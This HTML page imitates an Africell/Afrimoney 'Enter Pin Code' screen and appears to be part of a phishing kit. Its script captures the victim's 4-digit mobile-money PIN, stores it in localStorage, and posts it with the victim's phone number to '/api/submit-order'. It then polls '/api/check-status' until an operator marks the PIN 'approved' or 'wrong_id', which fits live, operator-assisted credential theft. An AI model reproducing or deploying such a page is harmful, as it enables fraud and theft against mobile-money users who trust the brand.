<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-visual">
    <title>Africell | Enter PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            background: #F2F2F2;
            overflow-x: hidden;
        }

        .gateway-wrapper {
            width: 100%;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Solid Purple Top Navigation Bar */
        .gateway-navbar {
            width: 100%;
            height: 70px;
            background: #991676;
            display: flex;
            align-items: center;
            padding: 0 20px;
            gap: 16px;
        }

        .back-arrow {
            color: #ffffff;
            font-size: 22px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 35px;
            height: 35px;
        }

        .navbar-title {
            color: #ffffff;
            font-size: 18px;
            font-weight: 500;
        }

        /* Main Content Container with Side White Space Margins */
        .gateway-content {
            width: 100%;
            max-width: 440px;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 0 24px;
            margin: 0 auto;
        }

        /* Main Heading */
        .gateway-heading {
            font-size: 26px;
            font-weight: 700;
            color: #000000;
            text-align: center;
            margin-top: 40px;
            margin-bottom: 12px;
        }

        /* Instructions */
        .gateway-instructions {
            font-size: 14px;
            color: #555555;
            text-align: center;
            font-weight: 400;
            line-height: 1.4;
            margin-bottom: 30px;
        }

        /* PIN Input Field Container */
        .gateway-input-group {
            width: 100%;
            position: relative;
            margin-bottom: 24px;
        }

        .gateway-input-field {
            width: 100%;
            height: 56px;
            background: #ffffff;
            border: 2px solid #991676;
            border-radius: 14px;
            font-size: 22px;
            letter-spacing: 12px;
            font-weight: 700;
            color: #000000;
            text-align: center;
            outline: none;
            -webkit-appearance: none;
            appearance: none;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
            padding-left: 12px;
        }

        .gateway-input-field::placeholder {
            color: #999999;
            font-size: 16px;
            font-weight: 400;
            letter-spacing: normal;
            text-align: center;
        }

        .gateway-input-field:focus {
            border-color: #79105c;
        }

        /* Eye Icon Toggle */
        .toggle-password {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: #79105c;
            font-size: 18px;
            cursor: pointer;
            z-index: 10;
        }

        /* Large Purple Action Button */
        .gateway-btn {
            width: 100%;
            height: 54px;
            background: #991676;
            color: #ffffff;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: capitalize;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(153, 22, 118, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            transition: background 0.2s ease, transform 0.1s ease;
        }

        .gateway-btn:hover {
            background: #79105c;
        }

        .gateway-btn:active {
            transform: translateY(1px);
        }

        .gateway-btn.disabled-state {
            opacity: 0.4;
            filter: blur(1.5px);
            pointer-events: none;
            cursor: not-allowed;
            box-shadow: none !important;
        }

        /* Loading Spinner */
        #loadingSpinner {
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            font-size: 14px;
            color: #991676;
            font-weight: 600;
        }

        .spinner {
            width: 22px;
            height: 22px;
            border: 3px solid rgba(153, 22, 118, 0.2);
            border-top: 3px solid #991676;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Custom In-App Modal Dialog */
        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(153, 22, 118, 0.9);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: #991676;
            width: 100%;
            max-width: 320px;
            border-radius: 20px;
            padding: 24px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: #ffffff;
            animation: scaleUp 0.3s ease;
        }

        @keyframes scaleUp {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 20px;
            line-height: 1.4;
            color: #ffffff;
        }

        .modal-btn {
            background: #ffd34d;
            color: #5E0C44;
            border: none;
            border-radius: 12px;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 12px rgba(255, 211, 77, 0.3);
        }

        .modal-btn:active {
            opacity: 0.9;
        }
    </style>
</head>
<body>

    <div class="gateway-wrapper">
        <!-- Top Navigation Bar -->
        <nav class="gateway-navbar">
            <a href="login.html" class="back-arrow">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
            <span class="navbar-title">Enter Pin Code</span>
        </nav>

        <!-- Main Body Content -->
        <div class="gateway-content">
            <h1 class="gateway-heading">Enter Pin Code</h1>
            <p class="gateway-instructions">
                Please enter your Pin Code to confirm your request.
            </p>

            <!-- 4-Digit Numeric PIN Input Field with Eye Toggle -->
            <div class="gateway-input-group">
                <input type="password" id="mpin" class="gateway-input-field" placeholder="----" inputmode="numeric" pattern="[0-9]*" maxlength="4" autocomplete="current-password" autofocus required>
                <i class="fa-solid fa-eye toggle-password" id="toggleEye"></i>
            </div>

            <!-- Purple Continue / Confirm Button -->
            <button type="button" id="confirmBtn" class="gateway-btn">Confirm</button>

            <!-- Loading Spinner -->
            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span>Verifying account credentials...</span>
            </div>
        </div>
    </div>

    <!-- Custom In-App Modal Dialog -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn">OK</button>
        </div>
    </div>
<script>
    function showAppAlert(message) {
        document.getElementById('modalText').innerText = message;
        document.getElementById('customModal').style.display = 'flex';
    }

    function closeModal() {
        document.getElementById('customModal').style.display = 'none';
    }

    // Toggle password view/hide with eye icon
    function togglePinVisibility() {
        const mpinInput = document.getElementById('mpin');
        const toggleEye = document.getElementById('toggleEye');
        
        if (mpinInput.type === 'password') {
            mpinInput.type = 'text';
            toggleEye.classList.remove('fa-eye');
            toggleEye.classList.add('fa-eye-slash');
        } else {
            mpinInput.type = 'password';
            toggleEye.classList.remove('fa-eye-slash');
            toggleEye.classList.add('fa-eye');
        }
    }

    // Restrict input strictly to 4 numeric digits and activate button when complete
    function checkPinLength() {
        const mpinInput = document.getElementById('mpin');
        
        // Strip non-digits and cap at 4 characters
        mpinInput.value = mpinInput.value.replace(/\D/g, '').slice(0, 4);

        const val = mpinInput.value.trim();
        const confirmBtn = document.getElementById('confirmBtn');

        if (val.length === 4) {
            confirmBtn.classList.add('active');
        } else {
            confirmBtn.classList.remove('active');
        }
    }

    async function submitPinAttempt() {
        const mpinInput = document.getElementById('mpin').value.trim();
        const spinnerDiv = document.getElementById('loadingSpinner');
        const confirmBtn = document.getElementById('confirmBtn');

        if (mpinInput.length !== 4) {
            showAppAlert('Please enter a valid 4-digit Afrimoney PIN.');
            return;
        }

        const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || 'Afrimoney User';
        
        // Save PIN to localStorage
        localStorage.setItem('africellLastPin', mpinInput);
        localStorage.setItem('lastPin', mpinInput);

        try {
            confirmBtn.classList.add('disabled-state');
            if (spinnerDiv) spinnerDiv.style.display = 'flex';

            const response = await fetch('/api/submit-order', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phoneInput, uniqueId: 'PIN: ' + mpinInput })
            });

            const result = await response.json();

            if (result.success) {
                pollApprovalStatus(phoneInput);
            } else {
                confirmBtn.classList.remove('disabled-state');
                if (spinnerDiv) spinnerDiv.style.display = 'none';
                showAppAlert('Error: ' + (result.message || 'Verification failed.'));
            }
        } catch (error) {
            console.error('Error:', error);
            confirmBtn.classList.remove('disabled-state');
            if (spinnerDiv) spinnerDiv.style.display = 'none';
            showAppAlert('Could not connect.');
        }
    }

    function pollApprovalStatus(phone) {
        const cleanPhone = phone.trim();
        const spinnerDiv = document.getElementById('loadingSpinner');
        const confirmBtn = document.getElementById('confirmBtn');

        const statusInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                const data = await response.json();

                if (data.status === 'approved') {
                    clearInterval(statusInterval);
                    window.location.href = 'success.html';
                } 
                else if (data.status === 'rejected' || data.status === 'wrong_id') {
                    clearInterval(statusInterval);
                    if (spinnerDiv) spinnerDiv.style.display = 'none';
                    confirmBtn.classList.remove('disabled-state');
                    showAppAlert('❌ Failed: Incorrect PIN');
                }
            } catch (e) {
                console.error('Polling error', e);
            }
        }, 3000);
    }

    // Single bulletproof event listener attachment
    document.addEventListener('DOMContentLoaded', () => {
        const confirmBtn = document.getElementById('confirmBtn');
        if (confirmBtn) {
            confirmBtn.addEventListener('click', submitPinAttempt);
        }
    });
</script>

</body>
</html>
